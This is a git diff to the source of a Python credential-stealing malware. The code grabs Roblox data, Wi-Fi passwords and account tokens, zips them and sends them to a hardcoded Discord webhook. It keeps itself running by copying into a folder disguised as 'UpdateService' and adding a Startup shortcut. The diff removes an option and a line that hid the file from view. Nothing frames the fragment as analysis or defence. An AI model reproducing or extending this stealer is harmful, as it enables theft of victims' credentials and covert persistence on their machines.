@@ -17,7 +17,6 @@ tokenPaths = {
 
 config = {
 	"Startup": True,
-	"Hide_self": True,
 	"webhook": 'https://discord.com/api/webhooks/1039097523643633684/-DWH0IuPWBN1SuX8Oh-7fnFs14TQfbp3yWgEcM0RGTzu4u2VyNsRxGqTUk-gclmEWWFv',
 }
 
@@ -62,7 +61,7 @@ class main():
 		self.writeRoblox()
 		self.grabwifi()
 
-		if config["Startup"] and not os.path.exists(fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService"): self.startup()
+		if config["Startup"] and not os.getcwd() == fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService": self.startup()
 
 		self.zipup()
 		self.send()
@@ -118,7 +117,6 @@ class main():
 		shortcut = shell.CreateShortCut(fr"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateService.lnk")
 		shortcut.Targetpath = fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService\{self.filename}"
 		shortcut.save()
-		if config['Hide_self'] and sys.argv[0] == fr'C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\UpdateService\{self.filename}': ctypes.windll.kernel32.SetFileAttributesW(sys.argv[0], 0x02)
 
 
 	def get_tokens(self, path):
